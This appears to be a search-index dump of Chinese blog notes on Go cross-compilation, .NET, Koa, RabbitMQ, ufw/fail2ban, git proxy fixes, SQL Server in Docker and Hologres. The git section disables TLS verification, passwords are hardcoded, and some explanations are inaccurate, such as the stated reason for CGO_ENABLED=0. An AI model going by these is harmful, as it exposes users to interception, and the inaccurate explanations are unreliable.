GOARCH=amd64 go build -o my-go-app-linux main.go 这里的 CGO_ENABLED=0 是必要的，因为默认情况下Go会使用cgo来进行一些系统调用，而Linux并不支持这些调用。\ngo build -o YourProgramName -ldflags \u0026#34;-s -w\u0026#34; --buildmode=exe -o out/linux/YourProgramName main.go go build -o Fs -ldflags \u0026#34;-s -w\u0026#34; --buildmode=exe main.go ubuntu go lang setup wget https://go.dev/dl/go1.17.3.linux-amd64.tar.gz (SUDO) tar -C /usr/local -xzf go1.17.3.linux-amd64.tar.gz 8. 测试你的可执行程序 编译完成后，你可以运行以下命令来检查生成的可执行文件：\n./my-go-app-linux \u0026ldquo;Hello, World!\u0026rdquo;\n9. 打包和分发（可选） Go程序打包并分发到Linux服务器上，可以使用tar或scp等工具来传输文件\ntar -czvf my-go-app-linux.tar.gz my-go-app-linux scp my-go-app-linux.tar.gz user@remote-server:/path/to/destination 切换win/linux打包 window下如何打包成exe文件，并运行。\n打开goland，点击Terminal 终端\n输入指令：\ngo env 查看 GOOS是否windows\nwindows 执行指令：\ngo env -w GOOS=windows 接下来运行\ngo build main.go 发现项目目录多了一个 main.exe的文件，这个就是根据项目生成的 exe文件。\nwindow下如何执行 main.exe 呢？ 打开 cmd 命令行\n进入到 main.exe 所在的目录，输入 main.exe 即可\n看到已经输出了 hello !\nlinux 执行指令修改为linux：\ngo env -w GOOS=linux 接下来运行\ngo build main.go 发现项目目录多了一个 main的文件，这个就是根据项目生成的 linux下的可执行文件\n那么如何在linux下执行 main 呢？\n将main上传到 linux系统的 /home目录。\n确保已经安装上go环境，使用 go version 看一下\n能够输出，说明已经安装好了go\n为main添加可执行权限\nchmod +x main 执行main程序：\n./main 可以看到输出 hello !\n","permalink":"https://qfsyso.github.io/posts/win-bilud-go-4-linux/","summary":"1. 安装必要的工具和依赖 首先，确保你已经安装了Go编译器和VS Code。如果还没有安装Go，可以从官方网站下载并安装。\n2. 配置Go环境 打开VS Code，按 Ctrl + Shift + P 打开命令面板，输入 \u0026ldquo;shell\u0026rdquo; 选择 \u0026ldquo;Shell: Windows\u0026rdquo; 或 \u0026ldquo;Shell: Linux\u0026rdquo;\n创建一个新的Go项目 在VS Code中创建一个新的文件夹作为你的Go项目目录，然后在终端中导航到该目录并初始化一个新的Go项目：\nmkdir my-go-app cd my-go-app go mod init my-go-app touch main.go 4. 编写Go程序 在 main.go 文件中编写一个简单的Hello World程序：\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 5. 安装交叉编译工具 ⭐ Go提供了一些工具来进行跨平台编译。你可以使用以下命令来安装这些工具：\ngo install github.com/golang/tools/cmd/goimports@latest go install golang.org/x/lint/golint@latest go install github.com/cweill/gotests/...@latest 6. 配置VS Code以使用Linux环境 你需要一个Linux环境来进行交叉编译。Windows Subsystem for Linux (WSL)来实现。 (https://learn.","title":" win bilud go 4 linux"},{"content":"Anolis8.4 包管理器为 yum。\n打开终端或命令提示符窗口，并切换到 root 用户。\n添加 Microsoft 包源。\nwget https://packages.microsoft.com/config/centos/8/packages-microsoft-prod.repo -O /etc/yum.repos.d/packages-microsoft-prod.repo 安装.NET 8 SDK。\nsudo yum install dotnet-sdk-8.0 运行时\nsudo yum install dotnet-runtime-8.0 安装完成后，可以通过以下命令验证.NET 8 是否已成功安装。\ndotnet --version test\ndotnet new console -o HelloWorld cd HelloWorld dotnet run ","permalink":"https://qfsyso.github.io/posts/anolis8.4-.net/","summary":"Anolis8.4 包管理器为 yum。\n打开终端或命令提示符窗口，并切换到 root 用户。\n添加 Microsoft 包源。\nwget https://packages.microsoft.com/config/centos/8/packages-microsoft-prod.repo -O /etc/yum.repos.d/packages-microsoft-prod.repo 安装.NET 8 SDK。\nsudo yum install dotnet-sdk-8.0 运行时\nsudo yum install dotnet-runtime-8.0 安装完成后，可以通过以下命令验证.NET 8 是否已成功安装。\ndotnet --version test\ndotnet new console -o HelloWorld cd HelloWorld dotnet run ","title":"Anolis8.4 .NET"},{"content":"koa Koa 是一个由 Express 原班人马打造的新的 Web 框架，旨在提供更小、更富表现力、更健壮的服务器处理逻辑。它使用 ES6 的新特性，如 Promises 和 generators，来简化异步流程控制。以下是一些关于 Koa 的关键点：\n特点 轻量级：Koa 的核心代码非常精简，没有捆绑很多中间件，这使得它的启动速度快、体积小。\n简洁的中间件系统：Koa 使用基于 Promise 的中间件模型，这个模型允许你通过 async/await 来编写异步代码，并且可以方便地在中间件之间共享逻辑。\n强大的上下文对象 (Context)：每个请求都有一个 context 对象，它包含了 request 和 response 的所有信息，简化了处理 HTTP 消息的流程。\n**错误处理：**Koa 通过统一的错误处理机制来简化错误处理过程，你可以在任何地方抛出错误，并在应用的顶层捕获它们。\n**内置支持 async/await：**由于 Koa 基于 ES6 的新特性，所有的处理函数默认都是异步的，你可以使用 async/await 来编写更简洁和直观的代码。\nnvm install 7 npm i koa node my-koa-app.js const Koa = require(\u0026#39;koa\u0026#39;); const app = new Koa(); // logger app.use(async (ctx, next) =\u0026gt; { await next(); // 调用下一个中间件 const rt = ctx.response.get(\u0026#39;X-Response-Time\u0026#39;); console.log(`${ctx.method} ${ctx.url} - ${rt}`); }); // x-response-time app.use(async (ctx, next) =\u0026gt; { const start = Date.now(); await next(); // 调用下一个中间件 const ms = Date.now() - start; ctx.set(\u0026#39;X-Response-Time\u0026#39;, `${ms}ms`); }); // response app.use(async ctx =\u0026gt; { ctx.body = \u0026#39;Hello World\u0026#39;; }); app.listen(3000); 在这个示例中，我们定义了两个中间件来记录请求的时间和日志。ctx 对象包含了所有的 HTTP 请求信息，你可以通过它访问 request 和 response。\n路由 Koa 本身不包含内置的路由系统，但是可以通过第三方中间件如 koa-router 来实现灵活的路由功能。\n//npm i koa-router const Koa = require(\u0026#39;koa\u0026#39;); const Router = require(\u0026#39;koa-router\u0026#39;); const app = new Koa(); const router = new Router(); router.get(\u0026#39;/\u0026#39;, (ctx, next) =\u0026gt; { ctx.body = \u0026#39;Hello World\u0026#39;; }); router.get(\u0026#39;/users/:id\u0026#39;, (ctx, next) =\u0026gt; { const id = ctx.params.id; ctx.body = `User ID: ${id}`; }); app.use(router.routes()).use(router.allowedMethods()); app.listen(3011); http://localhost:3011/ http://localhost:3011/users/1\nerr code: \u0026lsquo;MODULE_NOT_FOUND\u0026rsquo; delete node_modules\nnpm i 中间件 Koa 的强大之处在于其灵活的中间件系统。通过编写自定义的中间件来处理请求和响应，甚至可以修改 ctx 对象\nconst Koa = require(\u0026#39;koa\u0026#39;); const app = new Koa(); app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;First middleware start\u0026#39;); await next(); // 调用下一个中间件 console.log(\u0026#39;First middleware end\u0026#39;); }); app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;Second middleware start\u0026#39;); ctx.state.user = { name: \u0026#39;John Doe\u0026#39; }; // 设置一些状态 await next(); // 调用下一个中间件 console.log(\u0026#39;Second middleware end\u0026#39;); }); app.use(async (ctx) =\u0026gt; { console.log(\u0026#39;Third middleware start\u0026#39;); ctx.body = `Hello, ${ctx.state.user.name}`; console.log(\u0026#39;Third middleware end\u0026#39;); }); app.listen(3012); koa-compose 进行中间件组合 Koa 提供了一个内置的方法 koa-compose 来将多个中间件组合成一个中间件函数。这使得管理复杂的中间件堆栈变得更加容易。\nconst Koa = require(\u0026#39;koa\u0026#39;); const compose = require(\u0026#39;koa-compose\u0026#39;); const app = new Koa(); const middleware1 = async (ctx, next) =\u0026gt; { console.log(\u0026#39;Middleware 1 start\u0026#39;); await next(); console.log(\u0026#39;Middleware 1 end\u0026#39;); }; const middleware2 = async (ctx, next) =\u0026gt; { console.log(\u0026#39;Middleware 2 start\u0026#39;); ctx.state.user = { name: \u0026#39; koacom \u0026#39; }; await next(); console.log(\u0026#39;Middleware 2 end\u0026#39;); }; const middleware3 = async (ctx) =\u0026gt; { console.log(\u0026#39;Middleware 3 start\u0026#39;); ctx.body = `Hello, ${ctx.state.user.name}`; console.log(\u0026#39;Middleware 3 end\u0026#39;); }; const allMiddlewares = compose([middleware1, middleware2, middleware3]); app.use(allMiddlewares); app.listen(3020); koa-bodyparser koa-static koa-logger koa-session\nKoa 是一个现代的、高效能的 Web 框架，它利用最新的 JavaScript 特性来简化异步编程和中间件逻辑。它的轻量级设计让它非常适合构建小型到中型的应用。如果你正在寻找一个更简洁、高效的 Node.js Web 框架，Koa 绝对值得一试。\n","permalink":"https://qfsyso.github.io/posts/node-koa/","summary":"koa Koa 是一个由 Express 原班人马打造的新的 Web 框架，旨在提供更小、更富表现力、更健壮的服务器处理逻辑。它使用 ES6 的新特性，如 Promises 和 generators，来简化异步流程控制。以下是一些关于 Koa 的关键点：\n特点 轻量级：Koa 的核心代码非常精简，没有捆绑很多中间件，这使得它的启动速度快、体积小。\n简洁的中间件系统：Koa 使用基于 Promise 的中间件模型，这个模型允许你通过 async/await 来编写异步代码，并且可以方便地在中间件之间共享逻辑。\n强大的上下文对象 (Context)：每个请求都有一个 context 对象，它包含了 request 和 response 的所有信息，简化了处理 HTTP 消息的流程。\n**错误处理：**Koa 通过统一的错误处理机制来简化错误处理过程，你可以在任何地方抛出错误，并在应用的顶层捕获它们。\n**内置支持 async/await：**由于 Koa 基于 ES6 的新特性，所有的处理函数默认都是异步的，你可以使用 async/await 来编写更简洁和直观的代码。\nnvm install 7 npm i koa node my-koa-app.js const Koa = require(\u0026#39;koa\u0026#39;); const app = new Koa(); // logger app.use(async (ctx, next) =\u0026gt; { await next(); // 调用下一个中间件 const rt = ctx.","title":"node koa"},{"content":"云消息队列RabbitMQ版和开源版本的区别和优势 云消息队列 RabbitMQ 版是一款基于高可用分布式存储架构实现的 AMQP 0-9-1 协议的消息产品，能够兼容开源 RabbitMQ 客户端。与开源 RabbitMQ 相比，能够解决各种稳定性痛点（例如消息堆积、脑裂等问题），同时具备高并发、分布式、灵活扩缩容等云消息服务优势。\n云消息队列RabbitMQ版Serverless系列实例 云消息队列 RabbitMQ 版 Serverless 系列实例能力和预付费系列的企业版能力一样，但 Serverless 系列实例具有更高的弹性上限，且是按量后付费的计费方式，无需提前预留资源，按照实际使用量收费，降本增效。\nAccessKey AccessKey 添加 Vhost 添加 Exchange 添加 Queue\nExchange绑定queue\n导入项目到ideaIU amqp-java-demo \u0026gt; src \u0026gt; main \u0026gt; java，双击Config.java文件，将代码中HOSTNAME、USERNAME、PASSWORD三个参数值替换为阿里云RabbitMQ实例的公网接入点、静态用户名和静态密码。\nProducerTest.java 持续发送消息。 看到控制台 [SendResult] Message with msgId: ba42ffcb-ff05-422e-9e9f-37cdd8f2c9b0 has been ack-ed, deliveryTag: 1, multiple: false\nConsumerTest.java 持续接收消息。\n观察IntelliJ IDEA控制台打印的消息收发记录。 [ReceiveResult] Message Received successfully, messageId: fad269f2-a09d-441b-b74c-426c15fbbb17, consumerTag: yunQi-consumerTag, message: 消息Body-29\n查看Dashboard的实例指标变化 可以查看指定Queue的详细指标变化趋势，用于定位问题。\n消息轨迹 轨迹详情，查询对应消息的生产和投递轨迹详情。\n","permalink":"https://qfsyso.github.io/posts/aliyun-rabbitmq/","summary":"云消息队列RabbitMQ版和开源版本的区别和优势 云消息队列 RabbitMQ 版是一款基于高可用分布式存储架构实现的 AMQP 0-9-1 协议的消息产品，能够兼容开源 RabbitMQ 客户端。与开源 RabbitMQ 相比，能够解决各种稳定性痛点（例如消息堆积、脑裂等问题），同时具备高并发、分布式、灵活扩缩容等云消息服务优势。\n云消息队列RabbitMQ版Serverless系列实例 云消息队列 RabbitMQ 版 Serverless 系列实例能力和预付费系列的企业版能力一样，但 Serverless 系列实例具有更高的弹性上限，且是按量后付费的计费方式，无需提前预留资源，按照实际使用量收费，降本增效。\nAccessKey AccessKey 添加 Vhost 添加 Exchange 添加 Queue\nExchange绑定queue\n导入项目到ideaIU amqp-java-demo \u0026gt; src \u0026gt; main \u0026gt; java，双击Config.java文件，将代码中HOSTNAME、USERNAME、PASSWORD三个参数值替换为阿里云RabbitMQ实例的公网接入点、静态用户名和静态密码。\nProducerTest.java 持续发送消息。 看到控制台 [SendResult] Message with msgId: ba42ffcb-ff05-422e-9e9f-37cdd8f2c9b0 has been ack-ed, deliveryTag: 1, multiple: false\nConsumerTest.java 持续接收消息。\n观察IntelliJ IDEA控制台打印的消息收发记录。 [ReceiveResult] Message Received successfully, messageId: fad269f2-a09d-441b-b74c-426c15fbbb17, consumerTag: yunQi-consumerTag, message: 消息Body-29\n查看Dashboard的实例指标变化 可以查看指定Queue的详细指标变化趋势，用于定位问题。\n消息轨迹 轨迹详情，查询对应消息的生产和投递轨迹详情。","title":"aliyun RabbitMQ"},{"content":"安装ufw sudo apt update sudo apt install ufw #开启防火墙\nsudo ufw enable #关闭防火墙\nufw disable ufw status verbose ufw status numbered sudo ufw status #查看状态 sudo ufw disable #关闭 sudo ufw enble #开启 sudo ufw allow 8000/tcp #添加规则，允许所有ip访问8000端口 sudo ufw deny 8000/tcp #添加或者修改规则，禁止访问8000端口 sudo ufw delete 8000/tcp #删除该规则 恢复默认策略： ufw default deny incoming ufw default allow outgoing ufw default reject routed 重置UFW（将删除所有自定义策略并关闭UFW）\nufw reset 添加允许连接的商端口：\nufw allow [port] 放行指定范围的端口：\nufw allow 10010:10086/tcp ufw allow 10010:10086/udp 允许指定ip访问\n# 放行ip ufw allow 221.123.1.1 ufw allow 221.123.1.1 to any port 22 # 放行ip段 ufw allow 221.123.1.0/24 ufw allow 221.123.1.0/24 to any port 22 拒绝连接\nufw deny http ufw deny from 221.123.1.1 删除规则\n# 按编号删除 ufw delete [num] # 按实际规则删除 ufw delete allow http # or ufw delete allow 80 拒绝所有UDP连接： ufw deny proto udp any any ufw reload 适用于需要保留TCP服务但仅禁用UDP的场景。 选择性禁用高危UDP端口​​ 若需保留部分UDP服务（如DNS），可仅屏蔽高危端口（如53、161）：\nufw deny 53/udp ufw deny 161/udp 此方法通过安全组或防火墙分层管理，平衡安全性与功能性。\n禁止Ping（ICMP响应） ufw deny in on eth0 proto icmp 防火墙规则可灵活控制特定接口或网络环境下的Ping行为\nfail2ban 在 Debian 系统上，可以通过配置 fail2ban 来实现监控 SSH 登录（默认端口为 22）， 并在密码输错5次时封禁对应的 IP。以下是详细步骤：\n1. 安装 fail2ban sudo apt update sudo apt install fail2ban -y 2. 配置 fail2ban 创建自定义配置文件 默认配置文件位于 /etc/fail2ban/jail.conf，但我们不直接修改它，而是创建一个覆盖配置文件：\nsudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local 编辑 jail.local 使用喜欢的文本编辑器打开文件：\nsudo nano /etc/fail2ban/jail.local 找到 [sshd] 部分（如果没有，添加），并修改如下：\n[sshd] enabled = true # 启用此规则 port = 22 # 监控端口 filter = sshd # 使用默认 sshd 过滤规则 logpath = /var/log/auth.log # SSH 登录的日志文件路径（Debian 默认） bantime = 3600 # 封禁时间，单位为秒（此处为 1 小时） findtime = 600 # 计数时间窗口，单位为秒（此处为 10 分钟） maxretry = 5 # 最大重试次数 3. 检查 fail2ban 配置 确保 fail2ban 配置语法正确：\nsudo fail2ban-client -t 如果一切正常，会显示类似 OK 的输出。\n4. 启动并启用 fail2ban sudo systemctl start fail2ban sudo systemctl enable fail2ban 5. 验证设置是否生效 检查运行状态\nsudo fail2ban-client status 输出中应包括 sshd 监控规则。\n查看被封禁的 IP 如果触发了规则，可以通过以下命令查看当前被封禁的 IP：\nsudo fail2ban-client status sshd 手动测试 从另一个设备或终端尝试多次输入错误的 SSH 密码。 观察 IP 是否被封禁。 可以通过以下命令解封被封禁的 IP：\nsudo fail2ban-client unban IP_ADDRESS 6. 可选优化 修改默认封禁动作 fail2ban 默认封禁 IP 是通过修改 iptables 规则实现的。如果需要使用其他封禁机制，可以修改 [sshd] 部分的 action 参数。例如，发送邮件通知等。\n通过以上步骤，的 Debian 系统会监控 22 端口登录尝试，并在密码错误超过 5 次时自动封禁 IP。\nbantime = -1 # 设置永久封禁 ","permalink":"https://qfsyso.github.io/posts/debian-ufw/","summary":"安装ufw sudo apt update sudo apt install ufw #开启防火墙\nsudo ufw enable #关闭防火墙\nufw disable ufw status verbose ufw status numbered sudo ufw status #查看状态 sudo ufw disable #关闭 sudo ufw enble #开启 sudo ufw allow 8000/tcp #添加规则，允许所有ip访问8000端口 sudo ufw deny 8000/tcp #添加或者修改规则，禁止访问8000端口 sudo ufw delete 8000/tcp #删除该规则 恢复默认策略： ufw default deny incoming ufw default allow outgoing ufw default reject routed 重置UFW（将删除所有自定义策略并关闭UFW）\nufw reset 添加允许连接的商端口：\nufw allow [port] 放行指定范围的端口：\nufw allow 10010:10086/tcp ufw allow 10010:10086/udp 允许指定ip访问","title":"Debian ufw"},{"content":"Git Err\nunable to access ‘https://github.com/…’: Failed to connect to github.com port 443 after 21096 ms: Couldn’t connect to server\nerr\nOpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443\n重置git代理 检查是否开了网络代理，如果有先关闭 在命令行输入如下命令\ngit config --global --unset http.proxy git config --global --unset https.proxy 找到本机代理端口号\ngit config --global http.proxy http://127.0.0.1:端口号 git config --global https.proxy http://127.0.0.1:端口号 git config \u0026ndash;global http.sslVerify false\n网络与internet -\u0026gt; 代理\n手动设置代理 IP 端口 10809\ngit HTTP代理设置 要设置Git的HTTP代理，需要在终端中运行以下命令：\ngit config \u0026ndash;global http.proxy 代理地址:端口号\n例如，如果您正在使用127.0.0.1的代理服务器和8888的端口，那么您需要输入以下命令：\ngit config \u0026ndash;global http.proxy 127.0.0.1:8888\n如果您想在Git上使用的代理需要身份验证，请使用以下命令来配置HTTP代理：\ngit config \u0026ndash;global http.proxy 用户名:密码@代理地址:端口号\nHTTPS代理设置 如果您想设置HTTPS代理，需要在终端输入以下命令：\ngit config \u0026ndash;global https.proxy 代理地址:端口号\n例如，如果您正在使用127.0.0.1代理服务器和8888端口，那么您需要输入以下命令：\ngit config \u0026ndash;global https.proxy 127.0.0.1:8888\n如果您的代理需要身份验证，可以使用以下命令进行HTTPS代理设置：\ngit config \u0026ndash;global https.proxy 用户名:密码@代理地址:端口号\n取消代理设置 如果您想取消现有的代理设置，可以使用以下命令取消HTTP代理的配置：\ngit config \u0026ndash;global \u0026ndash;unset http.proxy\n取消HTTPS代理的配置：\ngit config \u0026ndash;global \u0026ndash;unset https.proxy\n检查当前代理设置 如果您想检查当前代理配置，可以使用以下命令来查看：\ngit config \u0026ndash;global \u0026ndash;get http.proxy git config \u0026ndash;global \u0026ndash;get https.proxy\n","permalink":"https://qfsyso.github.io/posts/git-443-couldt-connect/","summary":"Git Err\nunable to access ‘https://github.com/…’: Failed to connect to github.com port 443 after 21096 ms: Couldn’t connect to server\nerr\nOpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443\n重置git代理 检查是否开了网络代理，如果有先关闭 在命令行输入如下命令\ngit config --global --unset http.proxy git config --global --unset https.proxy 找到本机代理端口号\ngit config --global http.proxy http://127.0.0.1:端口号 git config --global https.proxy http://127.0.0.1:端口号 git config \u0026ndash;global http.sslVerify false\n网络与internet -\u0026gt; 代理\n手动设置代理 IP 端口 10809\ngit HTTP代理设置 要设置Git的HTTP代理，需要在终端中运行以下命令：\ngit config \u0026ndash;global http.","title":"git 443 couldt connect"},{"content":"创建容器 docker run -e \u0026#34;ACCEPT_EULA=Y\u0026#34; -e \u0026#34;MSSQL_SA_PASSWORD=Admin@123\u0026#34; -p 1433:1433 --name sql1 --hostname sql1 -d mcr.microsoft.com/mssql/server:2017-latest 进入 ```bash sudo docker exec -it sql1 \u0026ldquo;bash\u0026rdquo;\n/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P \u0026ldquo;Admin@123\u0026rdquo;\n```sql CREATE DATABASE TestDB; go SELECT Name from sys.databases; go use TestDB; go; CREATE TABLE Employees ( EmployeeID INT PRIMARY KEY, FirstName NVARCHAR(50), LastName NVARCHAR(50), BirthDate DATE, Position NVARCHAR(50) ); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (1, \u0026#39;z\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2000-01-01\u0026#39;, \u0026#39;Software Developer\u0026#39;); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (2, \u0026#39;l\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2001-01-15\u0026#39;, \u0026#39;Project Manager\u0026#39;); INSERT INTO Employees (FirstName, LastName, BirthDate, Position) VALUES ( \u0026#39;l1\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2001-01-15\u0026#39;, \u0026#39;Project Manager\u0026#39;); SELECT * FROM Employees; py测试 pip install pyodbc import pyodbc # 配置数据库连接信息 server = \u0026#39;localhost\u0026#39; database = \u0026#39;TestDB\u0026#39; username = \u0026#39;SA\u0026#39; password = \u0026#39;Admin@123\u0026#39; driver = \u0026#39;{ODBC Driver 17 for SQL Server}\u0026#39; # 根据你的SQL Server版本选择合适的驱动 # 建立连接 connection_string = f\u0026#34;DRIVER={driver};SERVER={server};DATABASE={database};UID={username};PWD={password}\u0026#34; conn = pyodbc.connect(connection_string) cursor = conn.cursor() # 执行查询 query = \u0026#34;SELECT * FROM Employees\u0026#34; cursor.execute(query) rows = cursor.fetchall() # 打印结果 for row in rows: print(row) # 关闭连接 cursor.close() conn.close() python mssql.py (1, \u0026lsquo;z\u0026rsquo;, \u0026rsquo;s\u0026rsquo;, datetime.date(2000, 1, 1), \u0026lsquo;Software Developer\u0026rsquo;) (2, \u0026rsquo;l\u0026rsquo;, \u0026rsquo;s\u0026rsquo;, datetime.date(2001, 1, 15), \u0026lsquo;Project Manager\u0026rsquo;)\nbackup USE master; go BACKUP DATABASE [TestDB] TO DISK = \u0026#39;C:\\path\\YourDatabaseName.bak\u0026#39; WITH FORMAT; restore USE master; GO ALTER DATABASE [TestDB] SET SINGLE_USER WITH ROLLBACK IMMEDIATE; RESTORE DATABASE [TestDB] FROM DISK = \u0026#39;C:\\path\\YourDatabaseName.bak\u0026#39; WITH REPLACE; ALTER DATABASE [TestDB] SET MULTI_USER; docker stop sql1 停止\n","permalink":"https://qfsyso.github.io/posts/docker-mssql/","summary":"创建容器 docker run -e \u0026#34;ACCEPT_EULA=Y\u0026#34; -e \u0026#34;MSSQL_SA_PASSWORD=Admin@123\u0026#34; -p 1433:1433 --name sql1 --hostname sql1 -d mcr.microsoft.com/mssql/server:2017-latest 进入 ```bash sudo docker exec -it sql1 \u0026ldquo;bash\u0026rdquo;\n/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P \u0026ldquo;Admin@123\u0026rdquo;\n```sql CREATE DATABASE TestDB; go SELECT Name from sys.databases; go use TestDB; go; CREATE TABLE Employees ( EmployeeID INT PRIMARY KEY, FirstName NVARCHAR(50), LastName NVARCHAR(50), BirthDate DATE, Position NVARCHAR(50) ); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (1, \u0026#39;z\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2000-01-01\u0026#39;, \u0026#39;Software Developer\u0026#39;); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (2, \u0026#39;l\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2001-01-15\u0026#39;, \u0026#39;Project Manager\u0026#39;); INSERT INTO Employees (FirstName, LastName, BirthDate, Position) VALUES ( \u0026#39;l1\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;2001-01-15\u0026#39;, \u0026#39;Project Manager\u0026#39;); SELECT * FROM Employees; py测试 pip install pyodbc import pyodbc # 配置数据库连接信息 server = \u0026#39;localhost\u0026#39; database = \u0026#39;TestDB\u0026#39; username = \u0026#39;SA\u0026#39; password = \u0026#39;Admin@123\u0026#39; driver = \u0026#39;{ODBC Driver 17 for SQL Server}\u0026#39; # 根据你的SQL Server版本选择合适的驱动 # 建立连接 connection_string = f\u0026#34;DRIVER={driver};SERVER={server};DATABASE={database};UID={username};PWD={password}\u0026#34; conn = pyodbc.","title":"Docker mssql"},{"content":"实时数仓Hologres Hologres是阿里云自研一站式实时数仓，统一数据平台架构，支持海量结构化/半结构化数据的实时写入、实时更新、实时加工、实时分析，支持标准SQL（兼容PostgreSQL协议），无缝对接主流BI工具，支持OLAP查询、即席分析、在线服务、向量计算多个场景，分析性能打破TPC-H世界记录，与MaxCompute、Flink、DataWorks深度融合，提供离在线一体化全栈数仓解决方案。\n大数据开发治理平台DataWorks DataWorks基于阿里云ODPS/EMR/CDP等大数据引擎，为数据仓库/数据湖/湖仓一体等解决方案提供统一的全链路大数据开发治理平台。作为阿里巴巴数据中台的建设者，DataWorks从2009年起不断沉淀阿里巴巴大数据建设方法论，同时与数万名政务/金融/零售/互联网/能源/制造等客户携手，助力产业数字化升级。\nDataV数据可视化 数据可视化DataV是阿里云数据可视化应用搭建平台，旨让更多的人看到数据可视化的魅力，帮助非专业的工程师通过图形化的界面轻松搭建专业水准的可视化应用，满足您会议展览、业务监控、风险预警、地理信息分析等多种业务的展示需求。\nHologres 64core VS ClickHouse 64core 在单表测试的13个查询中，11个查询Hologres比Clickhouse更快。 Clickhouse总耗时是Hologres的1.35倍。\n高性能实时写入与更新 通过Hologres Fixed Plan能力，实现高性能的实时写入与更新\nHologres Binlog:全链路的实时开发体验，简化数仓分层 通过Hologres Binl0g，结合Flink，可以实现全链路的实时开发体验，达到像Kafka、datahub同等的消息队列能力，简化数仓分层体验，增加数据复用能力。\nRuntime Filter:自动优化大小表Join效率 计算组(warehouse)实例:资源隔离、弹性、自动切流\nServerless Computing:提供大作业隔离与弹性处理 通过共享Serverless资源执行DML任务，保证大任务隔高与高可用，降低成本并提升性能。 同时支持设置单条SOL使用 Serverless的资源上限，支持设置使用Serverless资源的SOL优先级\n案例 小红书 ClickHouse Only 7天 乐元素:替换Hive+Presto构建高性能游戏运营分析平白 流量分析 开箱可用 性能比手写sql快10倍 节约成本 https://www.aliyun.com/activity/bigdata/hologres_cases\n电商漏斗模型分析 漏斗模型有助于企业识别在客户购买过程中的各个环节，通过优化漏斗的各个阶段来增加转化率，提升销售业绩。本案例将分析电商场景的漏斗模型、计算各环节的转化率。\n智慧城市人口财产主题分析 采集各个领域的数据进行整合和分析，使得城市管理更高效、服务更贴心。本案例以城市人口财产主题分析为背景，为您介绍DataWorks在智慧城市项目中的应用。\n视频个性化推荐(协同过滤) 协同过滤算法是一种用于个性化推荐的技术，它可以基于用户间的行为相似性或物品间的相似性为用户推荐物品。本案例将为您介绍在DataWorks中如何使用阿里云PAI的协同过滤算法实现视频的个性化推荐。\n实操 mysql -\u0026gt; hologres 创建专有网络VPC和交换机 192.168.0.0/16。 开通DataWorks 创建公网NAT\n创建Hologres表 登录Hologres控制台。 新建库，新建表\n-- 新建schema用于创建内表并导入数据 CREATE SCHEMA IF NOT EXISTS hologres_dataset_github_event; DROP TABLE IF EXISTS hologres_dataset_github_event.hologres_github_event; BEGIN; CREATE TABLE hologres_dataset_github_event.hologres_github_event ( id bigint PRIMARY KEY, actor_id bigint, actor_login text, repo_id bigint, repo_name text, org_id bigint, org_login text, type text, created_at timestamp with time zone NOT NULL, action text, commit_id text, member_id bigint, language text ); CALL set_table_property (\u0026#39;hologres_dataset_github_event.hologres_github_event\u0026#39;, \u0026#39;distribution_key\u0026#39;, \u0026#39;id\u0026#39;); CALL set_table_property (\u0026#39;hologres_dataset_github_event.hologres_github_event\u0026#39;, \u0026#39;event_time_column\u0026#39;, \u0026#39;created_at\u0026#39;); CALL set_table_property (\u0026#39;hologres_dataset_github_event.hologres_github_event\u0026#39;, \u0026#39;clustering_key\u0026#39;, \u0026#39;created_at\u0026#39;); COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.id IS \u0026#39;事件ID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_id IS \u0026#39;事件发起⼈ID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_login IS \u0026#39;事件发起⼈登录名\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_id IS \u0026#39;repoID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_name IS \u0026#39;repo名称\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_id IS \u0026#39;repo所属组织ID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_login IS \u0026#39;repo所属组织名称\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.type IS \u0026#39;事件类型\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.created_at IS \u0026#39;事件发⽣时间\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.action IS \u0026#39;事件行为\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.commit_id IS \u0026#39;提交记录ID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.member_id IS \u0026#39;成员ID\u0026#39;; COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.language IS \u0026#39;编程语⾔\u0026#39;; COMMIT; 实时同步数据至Hologres 登录DataWorks控制台。管理中心。\n数据源名称:自定义数据源名称，mysqlData。\n配置模式:选择连接串模式。\nJDBC连接地址:单击新增地址，配置信息如下：\n主机地址IP：rm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com\n端⼝号：3306\n输入数据库名称后，完整的JDBC URL为 jdbc:mysql://rm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com:3306 /github_events_share\n数据库名称:github_events_share\n用户名:workshop\n创建实时同步任务 